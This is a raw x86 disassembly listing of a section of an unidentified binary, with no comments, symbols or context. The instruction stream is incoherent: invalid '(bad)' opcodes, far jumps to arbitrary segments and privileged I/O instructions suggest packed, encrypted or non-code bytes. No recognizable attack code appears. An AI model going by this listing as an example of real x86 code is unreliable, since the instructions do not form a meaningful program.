  4081dd:	sub    esp,DWORD PTR es:[edx+0xd01605]
	...
  4081f0:	add    BYTE PTR [eax],al
  4081f2:	pop    eax
  4081f3:	pop    ebp
  4081f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081f5:	call   0x89ee:0x33725044
  4081fc:	cmc    
  4081fd:	dec    ebp
  4081fe:	xor    al,0x50
  408200:	cdq    
  408201:	mov    cl,0x44
  408203:	xor    DWORD PTR [edx],0x6c7e2456
  408209:	push   esp
  40820a:	adc    al,0x50
  40820c:	fiadd  WORD PTR [edi+0x55de40de]
  408212:	or     al,0xb5
  408214:	inc    eax
  408215:	or     BYTE PTR [esi+eax*8-0x18],0x54
  40821a:	mov    dh,0x54
  40821c:	mov    dh,0x55
  40821e:	hlt    
  40821f:	dec    edi
  408220:	cld    
  408221:	scas   al,BYTE PTR es:[edi]
  408222:	cmp    eax,esi
  408224:	call   0xa6cb5794
  408229:	push   ebp
  40822a:	jmp    0x34f:0xd44d8589
  408231:	add    al,0x3b
  408233:	imul   edx,esi,0xffffffc2
  408236:	les    ecx,FWORD PTR [esi+0x3c]
  408239:	push   esp
  40823a:	mov    ah,0x4f
  40823c:	jle    0x408293
  40823e:	outs   dx,BYTE PTR ds:[esi]
  40823f:	mov    edx,0x67acc2bf
  408244:	stc    
  408245:	cdq    
  408246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408247:	dec    edi
  408248:	jo     0x4082c9
  40824a:	(bad)  
  40824b:	push   edi
  40824c:	pop    esi
  40824d:	push   ebp
  40824e:	or     DWORD PTR ds:0xc65474c1,eax
  408254:	call   0x4082ad
	...
  408265:	into   
  408266:	push   esp
  408267:	ds push ebp
  408269:	jl     0x4082ba
  40826b:	hlt    
  40826c:	scas   al,BYTE PTR es:[edi]
  40826d:	dec    ebx
  40826e:	(bad)  
  40826f:	(bad)  
  408270:	call   0x2efa356d
  408275:	push   cs
  408276:	jle    0x4081fd
  408278:	adc    DWORD PTR [esi+0x6093ff4e],ebp
  40827e:	(bad)  [ecx-0x1b0de22]
  408284:	push   esp
  408285:	scas   eax,DWORD PTR es:[edi]
  408286:	push   esi
  408287:	inc    DWORD PTR [esi]
  408289:	xchg   esi,eax
  40828a:	sbb    BYTE PTR [ebp-0x30],dl
  40828d:	and    DWORD PTR [edi-0x19],ecx
  408290:	mov    ebp,0x60ff4eca
  408295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408296:	gs mul esi
  408299:	mov    bh,0x80
  40829b:	test   ecx,eax
  40829d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40829e:	dec    esi
  40829f:	(bad)  
  4082a0:	cmp    edi,edi
  4082a2:	test   eax,0x4e5f2837
  4082a7:	mov    ch,0xb9
  4082a9:	scas   eax,DWORD PTR es:[edi]
  4082aa:	dec    esi
  4082ab:	(bad)  
  4082ac:	mov    esi,0x2828b865
  4082b1:	addr16 pop ebp
  4082b3:	adc    DWORD PTR [ebx-0x71],esi
  4082b6:	dec    esi
  4082b7:	or     ebp,DWORD PTR [ecx+0x5c82f3ac]
  4082bd:	cwde   
  4082be:	push   esi
  4082bf:	call   DWORD PTR [esi-0x71f62634]
  4082c5:	jo     0x408345
  4082c7:	test   DWORD PTR [ebp+0x0],esp
	...
  4082d5:	add    BYTE PTR [eax],al
  4082d7:	add    BYTE PTR [edi],ch
  4082d9:	dec    esi
  4082da:	call   DWORD PTR [edx-0x6a7ab996]
  4082e0:	pop    ds
  4082e1:	dec    esi
  4082e2:	call   esp
  4082e4:	pusha  
  4082e5:	add    eax,0x3308b900
  4082ea:	mov    dh,0x5e
  4082ec:	das    
  4082ed:	add    BYTE PTR [ebp-0xb1e0c7],0xb9
  4082f4:	js     0x408277
  4082f6:	aaa    
  4082f7:	add    bl,cl
  4082f9:	add    bh,bh
  4082fb:	mov    ch,0x3a
  4082fd:	sar    esi,0xff
  408300:	xor    eax,0xbb2954ff
  408305:	add    ch,al
  408307:	int    0xc3
  408309:	mov    ecx,0x3e8a0bfe
  40830e:	adc    al,BYTE PTR [ebx-0x8ed49]
  408314:	push   ebp
  408315:	dec    esi
  408316:	je     0x408322
  408318:	repnz mov es,WORD PTR gs:[ebp-0x13eb2]
  408320:	popa   
  408321:	cld    
  408322:	mov    BYTE PTR [ebp-0x13eb2],0xa
  408329:	add    al,BYTE PTR [eax]
  40832b:	add    BYTE PTR [edx-0x4f],bl
  40832e:	lea    esi,[esi-0x427d4dcb]
  408334:	push   ds
  408335:	stos   BYTE PTR es:[edi],al
  408336:	(bad)  
  408337:	dec    DWORD PTR [edx]
  408339:	ss add DWORD PTR ds:[eax],0x0
	...
  40834a:	add    BYTE PTR [edi+0xd],dh
  40834d:	idiv   edi
  40834f:	mov    ch,0x6
  408351:	jne    0x408389
  408353:	mov    al,ds:0x16858d09
  408358:	stos   BYTE PTR es:[edi],al
  408359:	(bad)  
  40835a:	call   FWORD PTR [edx-0x121b4b4e]
  408360:	mov    cl,0xfe
  408362:	call   0x3fa15f
  408367:	mov    cl,0xc1
  408369:	jae    0x408374
  40836b:	dec    ecx
  40836c:	je     0x40833a
  40836e:	div    DWORD PTR ds:0x8f74ffb2
  408374:	mov    dl,0xb4
  408376:	in     al,0x3d
  408378:	mov    dl,0xfe
  40837a:	call   0x3fef59
  40837f:	arpl   WORD PTR [edi],bx
  408381:	mov    esp,esp
  408383:	mov    WORD PTR [esi+0x5c630052],?
  408389:	add    eax,DWORD PTR [ebx-0xa5384a]
  40838f:	ins    BYTE PTR es:[edi],dx
  408390:	pop    ebx
  408391:	xlat   BYTE PTR ds:[ebx]
  408392:	push   0xffffffe0
  408394:	loopne 0x4083f5
  408396:	neg    DWORD PTR [esp+0x4]
  40839a:	je     0x40835d
  40839c:	fist   WORD PTR [eax+0x52f454e8]
  4083a2:	add    bh,cl
  4083a4:	xchg   ebp,eax
  4083a5:	fild   DWORD PTR [ecx]
  4083a7:	arpl   bx,si
  4083a9:	xchg   ecx,eax
  4083aa:	jmp    FWORD PTR [esi+0xa75b56]
	...
  4083bc:	add    BYTE PTR [eax],al
  4083be:	icebp  
  4083bf:	push   ebx
  4083c0:	push   edx
  4083c1:	(bad)  
  4083c2:	out    dx,al
  4083c3:	dec    edx
  4083c4:	pop    edx
  4083c5:	call   FWORD PTR [esp+eiz*2]
  4083c8:	fadd   DWORD PTR [edi]
  4083ca:	or     ebp,DWORD PTR [eax-0x6b]
  4083cd:	dec    DWORD PTR [esp+esi*1]
  4083d0:	cwde   
  4083d1:	call   0xff92bfe2
  4083d6:	jbe    0x40842e
  4083d8:	pop    ebx
  4083d9:	in     eax,dx
  4083da:	mov    cl,0x8b
  4083dc:	push   edx
  4083dd:	push   DWORD PTR [esi-0x1b00a55e]
  4083e3:	fwait
  4083e4:	cwde   
  4083e5:	in     al,0xd4
  4083e7:	mov    ds:0x564eff52,eax
  4083ec:	pop    ebx
  4083ed:	lods   eax,DWORD PTR ds:[esi]
  4083ee:	adc    DWORD PTR [edx+edx*2-0x1],esi
  4083f2:	push   cs
  4083f3:	fwait
  4083f4:	pop    edx
  4083f5:	(bad)  
  4083f6:	mov    esp,0xcb07d883
  4083fb:	cmc    
  4083fc:	xchg   ebp,eax
  4083fd:	jmp    FWORD PTR [ebx+edx*8-0x24531f69]
  408404:	push   ecx
  408405:	call   DWORD PTR [esi]
  408407:	add    eax,0x97d65bf1
  40840c:	pop    esi
  40840d:	push   edx
  40840e:	mov    WORD PTR [edx+0x4c845a4d],ss
  408414:	inc    ecx
  408415:	dec    edx
  408416:	mov    dh,0x4c
  408418:	inc    esi
  408419:	push   edx
  40841a:	scas   al,BYTE PTR es:[edi]
  40841b:	pop    ecx
  40841c:	ss push edx
  40841e:	ins    BYTE PTR es:[edi],dx
  40841f:	pop    ebp
  408420:	jne    0x4083ba
	...
  40842e:	add    BYTE PTR [eax],al
  408430:	add    BYTE PTR [esp+ecx*2+0x2e],ah
  408434:	cwde   
  408435:	dec    ebx
  408436:	push   esp
  408437:	es push edx
  408439:	dec    ebx
  40843a:	xchg   esi,eax
  40843b:	push   esp
  40843c:	push   edx
  40843d:	dec    esp
  40843e:	dec    esp
  40843f:	pop    esp
  408440:	arpl   WORD PTR [esp+ecx*2+0xe],cx
  408444:	pop    ebx
  408445:	add    eax,0x34520692
  40844a:	xchg   edx,eax
  40844b:	stc    
  40844c:	pop    ecx
  40844d:	sub    al,0x4c
  40844f:	add    DWORD PTR [esi-0x12],ebp
  408452:	dec    ebx
  408453:	out    dx,al
  408454:	push   ecx
  408455:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408456:	dec    ebp
  408457:	rcl    BYTE PTR [esi+edx*1-0x69ae21b4],1
  40845e:	dec    ecx
  40845f:	shl    DWORD PTR [edi-0x24],0x4
  408463:	jmp    0xe93da5a2
  408468:	mov    dh,0xe9
  40846a:	pop    eax
  40846b:	push   0x48
  40846d:	neg    esi
  40846f:	call   0x348cdb51
  408474:	cld    
  408475:	les    ebx,FWORD PTR [ecx+0x7dd4515b]
  40847b:	and    al,0x50
  40847d:	cmp    eax,DWORD PTR ds:0xdd0560e9
  408483:	out    0x18,al
  408485:	and    al,BYTE PTR ds:0xc66df511
  40848b:	call   0x3dbae0
  408490:	or     BYTE PTR [ebp+ebp*1+0x6eff],0x0
	...
  4084a4:	sbb    al,0xc2
  4084a6:	idiv   DWORD PTR [ecx-0x57c95748]
  4084ac:	pusha  
  4084ad:	frstor [eax]
  4084af:	push   ds
  4084b0:	mov    al,ds:0xb414fe4b
  4084b5:	sbb    al,0x41
  4084b7:	jmp    0x3ef833d4
  4084bc:	adc    al,BYTE PTR [eax]
  4084be:	sar    BYTE PTR [ebp+0x35457e3a],0x3f
  4084c5:	push   es
  4084c6:	add    BYTE PTR [esi],dl
  4084c8:	icebp  
  4084c9:	dec    edx
  4084ca:	jne    0x4084bd
  4084cc:	test   al,0x92
  4084ce:	mov    cl,0x16
  4084d0:	mov    dl,0x4a
  4084d2:	jne    0x4084e5
  4084d4:	xchg   edx,eax
  4084d5:	shl    bl,1
  4084d7:	push   es
  4084d8:	or     al,0x3
  4084da:	call   0xff8b54fd
  4084df:	test   BYTE PTR ds:0xf5d1e857,0x4a
  4084e6:	call   DWORD PTR [ecx-0x4]
  4084e9:	adc    eax,DWORD PTR [ecx-0x17]
  4084ec:	mov    bl,0xd0
  4084ee:	pop    es
  4084ef:	shl    DWORD PTR [edx-0x6c3100b7],0xd0
  4084f6:	sti    
  4084f7:	(bad)  
  4084f8:	or     eax,0xd53fe803
  4084fd:	dec    edx
  4084fe:	jmp    DWORD PTR [eax+0x1400019e]
  408504:	pop    esi
  408505:	pop    ecx
  408506:	sub    DWORD PTR [ebp+0x0],0x0
	...
  408515:	add    BYTE PTR [eax],al
  408517:	and    al,0xdf
  408519:	call   DWORD PTR [edx]
  40851b:	bound  ecx,QWORD PTR [edx+0x75]
  40851e:	loope  0x408548
  408520:	daa    
  408521:	mov    dl,0x8e
  408523:	adc    edi,DWORD PTR [ebp+eax*2+0x0]
  408527:	fisubr WORD PTR [esi]
  408529:	(bad)  
  40852a:	(bad)  
  40852b:	fnsave [eax+ebp*2-0x4a]
  40852f:	in     eax,0x47
  408531:	jmp    DWORD PTR [edi-0x38]
  408534:	in     eax,dx
  408535:	inc    eax
  408536:	add    ch,bh
  408538:	xor    al,BYTE PTR [edi]
  40853a:	call   0x3fa46f
  40853f:	sub    eax,0x97fffb33
  408544:	dec    esi
  408545:	out    0x43,eax
  408547:	clc    
  408548:	mov    ah,0xfe
  40854a:	leave  
  40854b:	cmp    BYTE PTR [edx],al
  40854d:	add    BYTE PTR [ebp+0x1],dl
  408550:	stos   BYTE PTR es:[edi],al
  408551:	add    ah,0x8e
  408554:	sub    bh,bh
  408556:	imul   ebx,DWORD PTR [edx-0x4b],0xdd720874
  40855d:	mov    al,0xff
  40855f:	ins    DWORD PTR es:[edi],dx
  408560:	iret   
  408561:	inc    esp
  408562:	cld    
  408563:	loop   0x40856a
  408565:	add    bh,ch
  408567:	pushf  
  408568:	cs retf 
  40856a:	aaa    
  40856b:	sti    
  40856c:	add    eax,0x46e5d168
  408571:	(bad)  
  408572:	(bad)  
  408573:	xchg   edi,eax
  408574:	dec    esi
  408575:	out    0xaf,eax
  408577:	and    edi,DWORD PTR [edx+0x6afe]
	...
  408589:	add    dl,bh
  40858b:	sub    eax,0x13b380d
  408590:	push   0xff4055f4
  408595:	(bad)  
  408596:	test   DWORD PTR [eax+ebp*1-0x6a5205bf],0xab9adb7
  4085a1:	rcl    BYTE PTR [esi-0x4a1597e3],0x40
  4085a8:	dec    DWORD PTR [edi-0xe]
  4085ab:	data16 mov bh,0xff
  4085ae:	arpl   WORD PTR [ebx-0x4c],si
  4085b1:	arpl   WORD PTR [si+0x5e],bx
  4085b5:	mov    esi,0x4117904b
  4085ba:	arpl   sp,bp
  4085bc:	dec    esi
  4085bd:	jne    0x40861a
  4085bf:	test   BYTE PTR [edx],bl
  4085c1:	fstp   DWORD PTR [edx+ebx*8-0x1d30a9a5]
  4085c8:	dec    esi
  4085c9:	call   DWORD PTR [esi]
  4085cb:	test   al,0x4e
  4085cd:	jne    0x40862a
  4085cf:	les    edi,FWORD PTR [ecx+esi*4]
  4085d2:	jl     0x40858e
  4085d4:	cmp    al,0xc2
  4085d6:	pop    edi
  4085d7:	pop    esp
  4085d8:	mov    eax,0x47de7f8a
  4085dd:	cld    
  4085de:	or     eax,0xcaffd96b
  4085e3:	sub    eax,0xf66b754e
  4085e8:	fidiv  DWORD PTR [eax+0x457ce84c]
	...
  4085fa:	add    BYTE PTR [eax],al
  4085fc:	add    BYTE PTR [edi-0x1c],al
  4085ff:	sbb    BYTE PTR [esi-0x75],ch
  408602:	popf   
  408603:	add    ecx,DWORD PTR [ebx+0x411acc76]
  408609:	arpl   si,bx
  40860b:	push   cs
  40860c:	add    BYTE PTR [edi+0x5b19dba3],ch
  408612:	popf   
  408613:	add    edx,DWORD PTR [edi+0xb]
  408616:	outs   dx,DWORD PTR ds:[esi]
  408617:	test   DWORD PTR [eax],eax
  408619:	arpl   WORD PTR [ebx+0x43],dx
  40861c:	je     0x40865c
  40861e:	or     BYTE PTR [ebx+edx*8-0x42],bl
  408622:	aaa    
  408623:	dec    esi
  408624:	push   0xffc50640
  408629:	pushf  
  40862a:	ss push ecx
  40862c:	mov    bh,0xe4
  40862e:	(bad)  
  40862f:	mov    bl,0x67
  408631:	arpl   WORD PTR [esi+0x5e],bx
  408634:	mov    esi,0xd8a60533
  408639:	fs pop ebp
  40863b:	ret    
  40863c:	cmp    ah,al
  40863e:	dec    eax
  40863f:	sbb    DWORD PTR [edx-0x10],0x625a8e48
  408646:	mov    edi,0xd2630d68
  40864b:	add    ch,0xa8
  40864e:	adc    al,0xa9
  408650:	mov    WORD PTR [eax+ecx*2-0x686eb192],ds
  408657:	and    DWORD PTR [edi],eax
  408659:	push   ss
  40865a:	xchg   edx,eax
  40865b:	pop    esi
  40865c:	fmul   DWORD PTR [eax+0xfbdc48]
	...
  40866e:	add    BYTE PTR [eax],al
  408670:	test   al,al
  408672:	xchg   edi,eax
  408673:	dec    esi
  408674:	je     0x40861e
  408676:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408677:	cmp    al,0xa1
  408679:	add    ecx,ebp
  40867b:	mov    eax,0x476a59d9
  408680:	pop    edi
  408681:	fucomi st,st(0)
  408683:	fnstenv [edx+0x48]
  408686:	pushf  
  408687:	sti    
  408688:	inc    esp
  408689:	pop    esi
  40868a:	pop    ecx
  40868b:	dec    esi
  40868c:	inc    esp
  40868d:	jle    0x40863b
  40868f:	dec    edi
  408690:	retf   
  408691:	add    eax,0xdcf55ee9
  408696:	mov    ebp,0x9105a20b
  40869b:	sbb    eax,0x4ee8c66b
  4086a0:	xchg   esi,eax
  4086a1:	std    
  4086a2:	add    BYTE PTR [ebx+edi*1-0x69b219b8],dl
  4086a9:	dec    ecx
  4086aa:	(bad)  
  4086ac:	pop    esp
  4086ad:	pop    ebp
  4086ae:	jecxz  0x408642
  4086b0:	cld    
  4086b1:	inc    edi
  4086b2:	mov    al,ds:0x1c055f42
  4086b7:	jns    0x4086b8
  4086b9:	test   DWORD PTR [ebp+0x47ec30],esp
  4086bf:	mov    dh,0x5c
  4086c1:	ret    0x19fb
  4086c4:	ror    BYTE PTR es:[ebx],cl
  4086c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4086c8:	je     0x40867c
  4086ca:	sub    BYTE PTR [eax],ch
  4086cc:	pop    edi
  4086cd:	pop    ebp
  4086ce:	int    0x6c
  4086d0:	addr16 add eax,0xa90b
	...
  4086e2:	add    BYTE PTR [esi+0x60e8a180],dh
  4086e8:	add    eax,0x51724c7
  4086ed:	add    cl,ch
  4086ef:	pusha  
  4086f0:	inc    eax
  4086f1:	inc    ebp
  4086f2:	jne    0x40871a
  4086f4:	add    BYTE PTR [eax],al
  4086f6:	jmp    0xe9a9cea5
  4086fb:	stos   BYTE PTR es:[edi],al
  4086fc:	inc    edi
  4086fd:	imul   ebp,ecx,0xb9f3c1fd
  408703:	cmc    
  408704:	xor    esp,0x50481e3e
  40870a:	mov    WORD PTR ds:[edi-0x1],cs
  40870e:	mov    esp,0x649f5dac
  408713:	pop    edi
  408714:	add    eax,0x22b290b
  408719:	jmp    0x45e8a3
  40871e:	and    DWORD PTR [esi-0x5816bee3],0xa1110bd0
  408728:	(bad)  
  408729:	(bad)  
  40872a:	(bad)  
  40872b:	lock jnp 0x4086fe
  40872e:	fs in  al,0x51
  408731:	imul   esi
  408733:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408734:	mov    ch,0x51
  408736:	shl    edx,1
  408738:	(bad)  
  408739:	(bad)  
  40873a:	fimul  WORD PTR [ecx-0x50210f80]
  408740:	inc    esi
  408741:	call   0xff875b27
	...
  408756:	nop
  408757:	add    DWORD PTR [eax+0x54],ebp
  40875a:	bound  eax,QWORD PTR [edx-0x1]
  40875d:	(bad)  
  40875e:	pop    edi
  40875f:	mov    dl,0xf6
  408761:	inc    DWORD PTR ds:0xb35534ba
  408767:	inc    ebx
  408768:	jmp    edi
  40876a:	shl    BYTE PTR [eax-0x1],cl
  40876d:	inc    DWORD PTR [ebx+0x7f]
  408770:	in     al,0xf7
  408772:	in     eax,0xb9
  408774:	imul   eax,DWORD PTR [eax],0x41373d52
  40877a:	mov    edx,0x1df0b4b9
  40877f:	mov    ecx,0x8fcffffe
  408784:	sub    BYTE PTR [ecx+0x7a],al
  408787:	stos   BYTE PTR es:[edi],al
  408788:	jmp    0x88f9ad42
  40878d:	test   DWORD PTR [esi],esp
  40878f:	mov    cl,0xfe
  408791:	jmp    DWORD PTR [eax+0x624b6802]
  408797:	inc    edx
  408798:	(bad)  
  408799:	(bad)  
  40879a:	out    dx,eax
  40879b:	mov    cl,0xf6
  40879d:	call   DWORD PTR [ebp+0x635534b9]
  4087a3:	inc    edx
  4087a4:	jmp    edi
  4087a6:	xchg   esi,eax
  4087a7:	outs   dx,DWORD PTR ds:[esi]
  4087a8:	(bad)  
  4087a9:	call   ebx
  4087ab:	jg     0x408795
  4087ad:	not    DWORD PTR [ebp-0x47]
  4087b0:	mov    WORD PTR [ebp-0x14e7a],es
  4087b6:	retf   0x5c29
  4087b9:	cmp    BYTE PTR [eax],al
	...
  4087c7:	add    BYTE PTR [eax],al
  4087c9:	sti    
  4087ca:	add    edi,edi
  4087cc:	mov    ch,0x1a
  4087ce:	mov    dl,0xfe
  4087d0:	inc    DWORD PTR ds:0x3b2954f0
  4087d6:	add    eax,ebp
  4087d8:	test   eax,0xbfeb9ef
  4087dd:	arpl   WORD PTR [eax+edx*8+0x2878e018],bx
  4087e4:	imul   esp
  4087e6:	add    BYTE PTR ds:[ebp+0x53],dh
  4087ea:	xchg   DWORD PTR [edi+ecx*4],edx
  4087ed:	out    0x3b,al
  4087ef:	push   ebx
  4087f0:	call   esp
  4087f2:	jmp    0x40884f
  4087f4:	jbe    0x408807
  4087f6:	lahf   
  4087f7:	dec    ebx
  4087f8:	jmp    0x408869
  4087fa:	push   ebx
  4087fb:	inc    ebx
  4087fc:	je     0x408863
  4087fe:	or     al,0x5c
  408800:	push   0xfffffff1
  408802:	jbe    0x40884f
  408804:	(bad)  
  408805:	out    0x7b,al
  408807:	push   ebx
  408808:	jmp    DWORD PTR [eax+esi*1-0x249cfffd]
  40880f:	mov    ah,ah
  408811:	mov    esi,ss
  408813:	dec    edx
  408814:	add    BYTE PTR [edi],dl
  408816:	xchg   DWORD PTR [esi+0x4aae77bd],eax
  40881c:	jmp    DWORD PTR [ebx+0x28]
  40881f:	mov    ecx,0x52c3b682
  408824:	jmp    FWORD PTR [ebx+ebx*2-0x31]
  408828:	inc    esp
  408829:	sti    
  40882a:	pop    ebx
  40882b:	add    ebp,edi
	...
  408839:	add    BYTE PTR [eax],al
  40883b:	add    BYTE PTR ds:0x4b07d0fc,bl
  408841:	out    dx,al
  408842:	cdq    
  408843:	dec    DWORD PTR [esp+ebp*8-0x70]
  408847:	in     al,dx
  408848:	dec    esp
  408849:	and    al,0x4b
  40884b:	push   DWORD PTR [esi+0x4155b26]
  408851:	adc    al,0x4b
  408853:	push   esi
  408855:	push   ss
  408856:	push   ebx
  408857:	jmp    DWORD PTR [esp+eax*2]
  40885a:	rol    BYTE PTR [edi],1
  40885c:	or     esi,DWORD PTR [edx+ebx*4]
  40885f:	call   DWORD PTR [esp+esi*1]
  408862:	nop
  408863:	in     al,0x14
  408865:	push   es
  408866:	out    0x4a,al
  408868:	add    al,0xbb
  40886a:	lock pop ebx
  40886c:	cli    
  40886d:	jae    0x408845
  40886f:	dec    edx
  408870:	hlt    
  408871:	jp     0x40883c
  408873:	push   edx
  408874:	in     al,dx
  408875:	inc    esp
  408876:	(bad)  
  408877:	rcr    BYTE PTR [ebp+ebp*1+0x70],1
  40887b:	cdq    
  40887c:	fadd   QWORD PTR [esi+esi*4-0x70]
  408880:	mov    edi,0xbb4aae3c
  408885:	cmp    bl,BYTE PTR [eax+0x4a]
  408888:	les    eax,FWORD PTR [esp+edx*2+0x57]
  40888c:	mov    ah,0x44
  40888e:	xchg   esi,eax
  40888f:	pop    ebx
  408890:	leave  
  408891:	jbe    0x408821
  408893:	dec    edx
  408894:	lods   al,BYTE PTR ds:[esi]
  408895:	jp     0x408828
  408897:	push   edx
  408898:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408899:	inc    esp
  40889a:	xchg   ecx,eax
  40889b:	sub    dl,dl
  40889d:	inc    esp
  40889e:	jbe    0x4088ea
	...
  4088ac:	add    BYTE PTR [eax],al
  4088ae:	add    dh,cl
  4088b0:	xor    eax,0x2d8c4a76
  4088b5:	cmp    eax,0x5e448494
  4088ba:	shl    BYTE PTR [esi+ebp*1-0x39],0x49
  4088bf:	je     0x408905
  4088c1:	dec    esi
  4088c2:	shr    BYTE PTR [eax+0x2d],1
  4088c5:	out    0x7f,eax
  4088c7:	arpl   WORD PTR ds:0x56b4530,ax
  4088cd:	pushf  
  4088ce:	jle    0x408917
  4088d0:	mov    BYTE PTR ds:0x9305b947,ah
  4088d6:	test   BYTE PTR [ebp-0x46],0xf0
  4088da:	pop    ebx
  4088db:	inc    ebp
  4088dc:	jae    0x4088f4
  4088de:	dec    edx
  4088df:	jmp    0xa7fd:0xc7db0cc9
  4088e6:	add    esp,DWORD PTR [edx+edi*4]
  4088e9:	lock pop ebx
  4088eb:	jne    0x408930
  4088ed:	add    dh,dh
  4088ef:	stos   BYTE PTR es:[edi],al
  4088f0:	inc    esp
  4088f1:	jne    0x4088e0
  4088f3:	call   0xff73:0x10d107ba
  4088fa:	fidivr WORD PTR [eax]
  4088fc:	inc    edi
  4088fd:	add    al,0xe9
  4088ff:	lds    ecx,FWORD PTR [esi+0x41a36aec]
  408905:	push   0xffffffe9
  408907:	push   es
  408908:	sbb    bh,bh
  40890a:	xor    al,0xdf
  40890c:	sub    esi,DWORD PTR [ebp-0x76bbd579]
  408912:	and    al,0x0
	...
  408920:	add    BYTE PTR [eax],al
  408922:	sbb    ebp,DWORD PTR [ebp-0x7cd41701]
  408928:	push   0xffc66f6e
  40892d:	add    BYTE PTR [edi*8-0x45e416c0],dh
  408934:	pop    es
  408935:	xchg   ecx,eax
  408936:	pushf  
  408937:	pop    ecx
  408938:	(bad)  
  408939:	jle    0x408965
  40893b:	mov    edx,0xba476fb
  408940:	call   0xff8472dc
  408945:	xor    BYTE PTR ds:0xffb40009,bl
  40894b:	xor    BYTE PTR [ecx-0xc3b8d3],al
  408951:	dec    esi
  408952:	hlt    
  408953:	leave  
  408954:	sti    
  408955:	cdq    
  408956:	sbb    edi,DWORD PTR [edx-0x2793c1f5]
  40895c:	sub    BYTE PTR [eax+0x6a992d60],ch
  408962:	addr16 add eax,0x8a4a290b
  408968:	int    0xe8
  40896a:	pusha  
  40896b:	add    eax,0x5a8acc7
  408970:	add    cl,ch
  408972:	pusha  
  408973:	dec    edx
  408974:	inc    ebp
  408975:	add    BYTE PTR [esi],ah
  408977:	into   
  408978:	push   es
  408979:	add    BYTE PTR [edx],cl
  40897b:	popa   
  40897c:	jmp    FWORD PTR [ecx+0xa]
  40897f:	popa   
  408980:	jmp    FWORD PTR [ecx-0x6]
  408983:	mov    ebx,0xf444
	...
  408994:	add    BYTE PTR [edx-0x46],cl
  408997:	test   ah,dh
  408999:	adc    eax,0xd50fece
  40899e:	push   esp
  40899f:	idiv   edi
  4089a1:	xchg   edi,eax
  4089a2:	int    0xe7
  4089a4:	imul   edi,DWORD PTR [ecx+0x6],0x0
  4089a8:	or     ecx,DWORD PTR [edx]
  4089aa:	push   ebx
  4089ab:	add    al,0xe9
  4089ad:	cmp    al,BYTE PTR [edi]
  4089af:	add    BYTE PTR [eax],al
  4089b1:	and    al,bh
  4089b3:	daa    
  4089b4:	inc    ecx
  4089b5:	mov    edx,0xd20c74cd
  4089ba:	mov    esp,0x76cdffb3
  4089bf:	mov    dl,al
  4089c1:	(bad)  
  4089c3:	repz neg ebp
  4089c6:	int    0x4f
  4089c8:	push   edx
  4089c9:	repnz dec esp
  4089cb:	mov    bl,0xff
  4089cd:	or     eax,0x15f084bf
  4089d2:	int    0xfe
  4089d4:	call   0x40201f
  4089d9:	(bad)  
  4089db:	xlat   BYTE PTR ds:[ebx]
  4089dc:	test   DWORD PTR ds:0xef684fcd,0x1d00410d
  4089e6:	xchg   ebx,eax
  4089e7:	lock neg DWORD PTR [ebp-0x8ca0133]
  4089ee:	push   ds
  4089ef:	inc    ecx
  4089f0:	add    BYTE PTR [edx+0x7dffb2fd],ah
  4089f6:	mov    edi,0xe484
	...
  408a07:	add    BYTE PTR [ebp-0x33],dl
  408a0a:	(bad)  
  408a0b:	push   0x63
  408a0d:	sub    al,0xdb
  408a0f:	call   0x3bee:0xff036d6b
  408a16:	dec    edi
  408a17:	call   FWORD PTR [ebx+eax*2]
  408a1a:	or     eax,0x36d4a55
  408a1f:	call   0xff8888f6
  408a24:	fidiv  DWORD PTR [eax+0x62fcf757]
  408a2a:	(bad)  
  408a2c:	jl     0x4089be
  408a2e:	or     al,0x41
  408a30:	arpl   WORD PTR [ebx-0x6f],dx
  408a33:	lock in al,dx
  408a35:	dec    edx
  408a36:	inc    edi
  408a37:	call   DWORD PTR [esi+0x63411d19]
  408a3d:	inc    esp
  408a3e:	jae    0x4089f3
  408a40:	int3   
  408a41:	jb     0x408ac0
  408a43:	test   DWORD PTR [ebx-0x1100b85e],edi
  408a49:	test   al,0x27
  408a4b:	div    DWORD PTR [edx+ebx*4+0x53f567b4]
  408a52:	(bad)  
  408a53:	jmp    DWORD PTR [ebp-0x6308ac00]
  408a59:	ret    0x3546
  408a5c:	cs inc ebp
  408a5e:	(bad)  
  408a5f:	inc    DWORD PTR [ebx+edi*1+0x3684ff92]
  408a66:	inc    ebx
  408a67:	je     0x408ac3
  408a69:	scas   eax,DWORD PTR es:[edi]
  408a6a:	mov    ah,bl
	...
  408a78:	add    BYTE PTR [eax],al
  408a7a:	add    BYTE PTR [edx+ebx*8+0x46],ch
  408a7e:	add    al,0xf6
  408a80:	cmp    eax,DWORD PTR [esi+0x30]
  408a83:	aam    0xb0
  408a85:	arpl   di,si
  408a87:	pop    esp
  408a88:	add    BYTE PTR [edi+eiz*8-0xb9416a],dh
  408a8f:	cmp    BYTE PTR [ebx-0x6],bl
  408a92:	mov    edi,0xb3ef05cf
  408a97:	inc    esp
  408a98:	neg    DWORD PTR [eax+0x47]
  408a9b:	xor    al,0x49
  408a9d:	ins    BYTE PTR es:[edi],dx
  408a9e:	fs xor al,0x41
  408aa1:	push   cs
  408aa2:	icebp  
  408aa3:	and    al,0x41
  408aa5:	jmp    0xf66a692c
  408aaa:	inc    esi
  408aab:	adc    al,0x6
  408aad:	jge    0x408a74
  408aaf:	loope  0x408a33
  408ab1:	std    
  408ab2:	dec    esi
  408ab3:	add    al,0x41
  408ab5:	jmp    0x9cc50289
  408aba:	pop    ebx
  408abb:	in     al,dx
  408abc:	inc    eax
  408abd:	(bad)  
  408abe:	add    esi,DWORD PTR [edi-0x4f]
  408ac1:	inc    edx
  408ac2:	add    al,0xd6
  408ac4:	mov    ah,BYTE PTR [ecx+0x1940dc4e]
  408aca:	inc    edi
  408acb:	push   cs
  408acc:	sub    bh,BYTE PTR [esi+0x1b2dcc46]
  408ad2:	xor    esp,eax
  408ad4:	inc    eax
  408ad5:	repnz inc ebx
  408ad7:	aaa    
  408ad8:	fldcw  WORD PTR [ecx-0x78]
  408adb:	fwait
  408adc:	cmp    BYTE PTR [esi+0x46],dl
	...
  408aee:	arpl   WORD PTR [ecx+0x40a4dc21],di
